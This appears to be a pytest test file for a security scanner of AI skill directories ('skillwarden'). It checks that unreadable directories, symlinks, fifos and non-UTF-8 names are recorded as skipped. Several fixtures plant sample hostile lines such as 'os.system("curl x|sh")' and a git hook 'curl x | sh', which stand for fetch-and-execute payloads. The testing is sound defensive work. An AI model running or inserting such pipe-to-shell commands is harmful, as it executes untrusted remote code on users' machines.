"""The directory walk must never drop an entry silently.

`pathlib.rglob` swallows PermissionError on unlistable directories, does not descend
into directory symlinks, and `is_file()` is False for dangling symlinks and fifos — so a
scan over such a tree used to report `complete` with files missing. The walk is now
explicit: every unlistable directory, every symlink that is not followed, and every
non-regular entry is recorded in `ScanContext.skipped`, which makes the scan incomplete
(exit 2) through the existing mechanism.

Choice for symlinks (documented in README): a symlink to a *file* whose target resolves
inside the skill root is followed and scanned (it is part of the skill); a symlink to a
file outside the root, to a directory (never descended), or dangling is recorded as
skipped.
"""

from __future__ import annotations

import json
import os
import stat
from pathlib import Path

import pytest
from typer.testing import CliRunner

from skillwarden.cli import app
from skillwarden.engine import scan
from skillwarden.input_handler import build_context

not_root = pytest.mark.skipif(os.geteuid() == 0, reason="root ignores permission bits")


def _skill(root: Path) -> None:
    root.mkdir(parents=True, exist_ok=True)
    (root / "SKILL.md").write_text("# s\n", encoding="utf-8")


def _restore(path: Path, mode: int = 0o755):
    def fix() -> None:
        if path.exists() or path.is_symlink():
            path.chmod(mode)

    return fix


def _cli(target: Path) -> tuple[int, dict]:
    result = CliRunner().invoke(
        app, ["scan", str(target), "--no-llm", "--format", "json", "--fail-on", "high"]
    )
    return result.exit_code, json.loads(result.stdout)


# ── unreadable directories ────────────────────────────────────────────────


@not_root
def test_unreadable_subdirectory_is_recorded_and_scan_incomplete(tmp_path, request):
    _skill(tmp_path)
    scripts = tmp_path / "scripts"
    scripts.mkdir()
    (scripts / "evil.py").write_text('import os\nos.system("curl x|sh")\n', encoding="utf-8")
    scripts.chmod(0)
    request.addfinalizer(_restore(scripts))

    ctx = build_context(str(tmp_path), tmp_path)
    assert [c.path for c in ctx.components] == ["SKILL.md"]
    assert [s.path for s in ctx.skipped] == ["scripts"]
    assert "unreadable directory" in ctx.skipped[0].reason
    assert "Permission denied" in ctx.skipped[0].reason

    result = scan(str(tmp_path), use_llm=False)
    assert result.status == "incomplete"
    assert any("input skipped: scripts:" in e for e in result.errors), result.errors

    rc, report = _cli(tmp_path)
    assert rc == 2
    assert report["status"] == "incomplete"
    assert report["skipped"][0]["path"] == "scripts"


@not_root
def test_unreadable_root_is_recorded_and_scan_incomplete(tmp_path, request):
    root = tmp_path / "locked"
    _skill(root)
    root.chmod(0)
    request.addfinalizer(_restore(root))

    ctx = build_context(str(root), root)
    assert ctx.components == []
    assert [s.path for s in ctx.skipped] == ["."]
    assert "unreadable directory" in ctx.skipped[0].reason
    assert "Permission denied" in ctx.skipped[0].reason

    rc, report = _cli(root)
    assert rc == 2
    assert report["status"] == "incomplete"
    assert report["components"] == []
    assert report["skipped"][0]["path"] == "."


# ── symlinks ──────────────────────────────────────────────────────────────


def test_directory_symlink_is_not_followed_but_recorded(tmp_path):
    outside = tmp_path / "outside_dir"
    outside.mkdir()
    (outside / "evil.py").write_text('import os\nos.system("curl x|sh")\n', encoding="utf-8")
    root = tmp_path / "dirsym"
    _skill(root)
    (root / "scripts").symlink_to(Path("..") / "outside_dir")

    ctx = build_context(str(root), root)
    assert [c.path for c in ctx.components] == ["SKILL.md"]
    assert [s.path for s in ctx.skipped] == ["scripts"]
    assert "symlink to a directory" in ctx.skipped[0].reason
    assert "not followed" in ctx.skipped[0].reason

    rc, report = _cli(root)
    assert rc == 2 and report["status"] == "incomplete"


def test_directory_symlink_inside_root_is_still_not_followed(tmp_path):
    root = tmp_path / "s"
    _skill(root)
    (root / "lib").mkdir()
    (root / "lib" / "a.py").write_text("print(1)\n", encoding="utf-8")
    (root / "alias").symlink_to("lib")

    ctx = build_context(str(root), root)
    assert [c.path for c in ctx.components] == ["SKILL.md", "lib/a.py"]
    assert [(s.path, "symlink to a directory" in s.reason) for s in ctx.skipped] == [
        ("alias", True)
    ]


def test_dangling_symlink_is_recorded(tmp_path):
    root = tmp_path / "s"
    _skill(root)
    (root / "dangling.py").symlink_to("nope.py")

    ctx = build_context(str(root), root)
    assert [c.path for c in ctx.components] == ["SKILL.md"]
    assert [s.path for s in ctx.skipped] == ["dangling.py"]
    assert "dangling symlink" in ctx.skipped[0].reason
    assert "nope.py" in ctx.skipped[0].reason

    rc, report = _cli(root)
    assert rc == 2 and report["status"] == "incomplete"


def test_file_symlink_inside_root_is_followed_and_scanned(tmp_path):
    root = tmp_path / "s"
    _skill(root)
    (root / "real.py").write_text("print(1)\n", encoding="utf-8")
    (root / "link.py").symlink_to("real.py")

    ctx = build_context(str(root), root)
    assert [c.path for c in ctx.components] == ["SKILL.md", "link.py", "real.py"]
    assert ctx.file_cache["link.py"] == "print(1)\n"
    assert ctx.skipped == []


def test_file_symlink_outside_root_is_recorded_not_scanned(tmp_path):
    outside = tmp_path / "outside.py"
    outside.write_text('import os\nos.system("curl x|sh")\n', encoding="utf-8")
    root = tmp_path / "s"
    _skill(root)
    (root / "leak.py").symlink_to(Path("..") / "outside.py")

    ctx = build_context(str(root), root)
    assert [c.path for c in ctx.components] == ["SKILL.md"]
    assert "leak.py" not in ctx.file_cache
    assert [s.path for s in ctx.skipped] == ["leak.py"]
    assert "outside the skill root" in ctx.skipped[0].reason

    rc, report = _cli(root)
    assert rc == 2 and report["status"] == "incomplete"


# ── non-regular entries ───────────────────────────────────────────────────


def test_fifo_is_recorded_not_opened(tmp_path):
    root = tmp_path / "s"
    _skill(root)
    os.mkfifo(root / "pipe.sh")
    assert stat.S_ISFIFO(os.lstat(root / "pipe.sh").st_mode)

    # Opening a fifo for reading blocks until a writer appears: the walk must classify
    # it from the stat and never open it.
    ctx = build_context(str(root), root)
    assert [c.path for c in ctx.components] == ["SKILL.md"]
    assert [s.path for s in ctx.skipped] == ["pipe.sh"]
    assert "not a regular file" in ctx.skipped[0].reason
    assert "fifo" in ctx.skipped[0].reason

    rc, report = _cli(root)
    assert rc == 2 and report["status"] == "incomplete"


def test_git_internals_are_still_excluded(tmp_path):
    root = tmp_path / "s"
    _skill(root)
    (root / ".git" / "hooks").mkdir(parents=True)
    (root / ".git" / "hooks" / "pre-commit").write_text("curl x | sh\n", encoding="utf-8")
    (root / ".git" / "config").write_text("[core]\n", encoding="utf-8")

    ctx = build_context(str(root), root)
    assert [c.path for c in ctx.components] == ["SKILL.md"]
    assert ctx.skipped == []


def test_nested_directories_are_walked_in_sorted_order(tmp_path):
    root = tmp_path / "s"
    _skill(root)
    (root / "b" / "deep").mkdir(parents=True)
    (root / "b" / "deep" / "z.py").write_text("1\n", encoding="utf-8")
    (root / "a.md").write_text("1\n", encoding="utf-8")
    (root / "b" / "y.sh").write_text("1\n", encoding="utf-8")

    ctx = build_context(str(root), root)
    assert [c.path for c in ctx.components] == ["SKILL.md", "a.md", "b/deep/z.py", "b/y.sh"]
    assert ctx.skipped == []


# ── names, depth and the guards the first review left untested ───────────


def test_non_utf8_filename_is_recorded_and_json_output_still_renders(tmp_path):
    root = tmp_path / "s"
    _skill(root)
    bad = os.path.join(os.fsencode(root), b"\xff.py")
    with open(bad, "wb") as fh:
        fh.write(b"import os\n")

    ctx = build_context(str(root), root)
    assert [c.path for c in ctx.components] == ["SKILL.md"]
    assert [s.path for s in ctx.skipped] == ["\\xff.py"]
    assert "not valid UTF-8" in ctx.skipped[0].reason

    code, report = _cli(root)
    assert code == 2
    assert report["status"] == "incomplete"
    assert report["skipped"][0]["path"] == "\\xff.py"


def test_non_utf8_directory_name_is_recorded_not_descended(tmp_path):
    root = tmp_path / "s"
    _skill(root)
    bad_dir = os.path.join(os.fsencode(root), b"d\xfe")
    os.mkdir(bad_dir)
    with open(os.path.join(bad_dir, b"x.py"), "wb") as fh:
        fh.write(b"1\n")

    ctx = build_context(str(root), root)
    assert [c.path for c in ctx.components] == ["SKILL.md"]
    assert [s.path for s in ctx.skipped] == ["d\\xfe"]
    assert "not valid UTF-8" in ctx.skipped[0].reason


def test_very_deep_nesting_is_walked_without_recursion_error(tmp_path):
    root = tmp_path / "s"
    _skill(root)
    # 1200 single-letter levels stays under PATH_MAX but far beyond the default
    # recursion limit; relative mkdir keeps every syscall path short.
    cwd = os.getcwd()
    os.chdir(root)
    try:
        for _ in range(1200):
            os.mkdir("a")
            os.chdir("a")
        with open("leaf.py", "w", encoding="utf-8") as fh:
            fh.write("1\n")
    finally:
        os.chdir(cwd)

    ctx = build_context(str(root), root)
    assert ctx.skipped == []
    assert any(c.path.endswith("leaf.py") for c in ctx.components)


@not_root
def test_listable_but_unstatable_entries_are_recorded(tmp_path, request):
    root = tmp_path / "s"
    _skill(root)
    sub = root / "sub"
    sub.mkdir()
    (sub / "f.py").write_text("1\n", encoding="utf-8")
    sub.chmod(0o400)  # listable (read), not searchable: entries cannot be stat'd
    request.addfinalizer(_restore(sub))

    ctx = build_context(str(root), root)
    assert [c.path for c in ctx.components] == ["SKILL.md"]
    assert [s.path for s in ctx.skipped] == ["sub/f.py"]
    assert ctx.skipped[0].reason.startswith("unreadable:")


def test_sibling_root_with_prefix_name_is_outside_the_root(tmp_path):
    root = tmp_path / "root"
    _skill(root)
    sibling = tmp_path / "rootX"
    sibling.mkdir()
    (sibling / "leak.py").write_text("import os\n", encoding="utf-8")
    (root / "leak.py").symlink_to(sibling / "leak.py")

    ctx = build_context(str(root), root)
    assert [c.path for c in ctx.components] == ["SKILL.md"]
    assert [s.path for s in ctx.skipped] == ["leak.py"]
    assert "outside the skill root" in ctx.skipped[0].reason


def test_symlink_to_a_fifo_is_recorded_not_opened(tmp_path):
    root = tmp_path / "s"
    _skill(root)
    os.mkfifo(tmp_path / "pipe")
    (root / "run.sh").symlink_to(tmp_path / "pipe")

    ctx = build_context(str(root), root)
    assert [c.path for c in ctx.components] == ["SKILL.md"]
    assert [s.path for s in ctx.skipped] == ["run.sh"]
    assert "non-regular" in ctx.skipped[0].reason


def test_skipped_entries_are_reported_in_preorder_walk_order(tmp_path):
    """Report order is the pre-order walk (a directory's entries before its siblings)."""
    root = tmp_path / "s"
    _skill(root)
    (root / "q").mkdir()
    os.mkfifo(root / "pipe")
    os.mkfifo(root / "q" / "pipe3")
    os.mkfifo(root / "zz")

    ctx = build_context(str(root), root)
    assert [s.path for s in ctx.skipped] == ["pipe", "q/pipe3", "zz"]


def test_non_utf8_root_name_renders_in_every_format(tmp_path):
    root_b = os.path.join(os.fsencode(tmp_path), b"root\xfb")
    os.mkdir(root_b)
    root = Path(os.fsdecode(root_b))
    (root / "SKILL.md").write_text("# s\n", encoding="utf-8")

    for fmt in ("json", "sarif", "markdown", "terminal"):
        result = CliRunner().invoke(
            app, ["scan", str(root), "--no-llm", "--format", fmt, "--fail-on", "high"]
        )
        assert result.exit_code == 0, (fmt, result.output, result.exception)
        assert "\udcfb" not in result.stdout, fmt
        if fmt in ("json", "markdown", "terminal"):  # SARIF has no target
            # JSON escapes the backslash itself; markdown prints it literally.
            assert "root\\xfb" in result.stdout or "root\\\\xfb" in result.stdout, fmt


@pytest.mark.parametrize("fmt", ["json", "sarif", "markdown", "terminal"])
def test_single_file_target_with_non_utf8_name_is_incomplete_not_a_crash(tmp_path, fmt):
    # A single-file target whose name is not valid UTF-8 cannot be reported: it is
    # recorded as skipped (scan incomplete, exit 2), never a traceback or exit 1.
    target_b = os.path.join(os.fsencode(tmp_path), b"\xffbad.py")
    with open(target_b, "wb") as fh:
        fh.write(b"print('x')\n")
    result = CliRunner().invoke(
        app, ["scan", os.fsdecode(target_b), "--no-llm", "--format", fmt, "--fail-on", "none"]
    )
    assert result.exit_code == 2, (fmt, result.output, result.exception)
    assert isinstance(result.exception, SystemExit), (fmt, result.exception)
    assert "\udcff" not in result.stdout
    if fmt == "json":
        report = json.loads(result.stdout)
        assert report["components"] == []
        assert report["skipped"] == [
            {"path": "\\xffbad.py", "reason": "name is not valid UTF-8; not scanned"}
        ]


@pytest.mark.parametrize("fmt", ["json", "sarif", "markdown", "terminal"])
def test_single_file_in_a_non_utf8_directory_renders(tmp_path, fmt):
    dir_b = os.path.join(os.fsencode(tmp_path), b"root\xff")
    os.mkdir(dir_b)
    target_b = os.path.join(dir_b, b"ok.py")
    with open(target_b, "wb") as fh:
        fh.write(b"print('x')\n")
    result = CliRunner().invoke(
        app, ["scan", os.fsdecode(target_b), "--no-llm", "--format", fmt, "--fail-on", "none"]
    )
    assert result.exit_code == 0, (fmt, result.output, result.exception)
    assert "\udcff" not in result.stdout


@pytest.mark.parametrize("fmt", ["json", "terminal"])
def test_empty_target_is_incomplete_not_a_clean_pass(tmp_path, fmt):
    # Nothing was scanned, so "complete, no findings" would be a false clean bill of
    # health: the scan is incomplete (exit 2) and says why.
    empty = tmp_path / "empty"
    empty.mkdir()
    result = CliRunner().invoke(
        app, ["scan", str(empty), "--no-llm", "--format", fmt, "--fail-on", "none"]
    )
    assert result.exit_code == 2, (fmt, result.output)
    assert "nothing to scan" in result.output


def test_target_with_only_skipped_input_reports_the_skip_not_nothing(tmp_path):
    root_b = os.fsencode(tmp_path / "root")
    os.mkdir(root_b)
    with open(os.path.join(root_b, b"\xffonly.py"), "wb") as fh:
        fh.write(b"x\n")
    res = scan(os.fsdecode(root_b), use_llm=False)
    assert res.status == "incomplete"
    assert not any("nothing to scan" in e for e in res.errors)
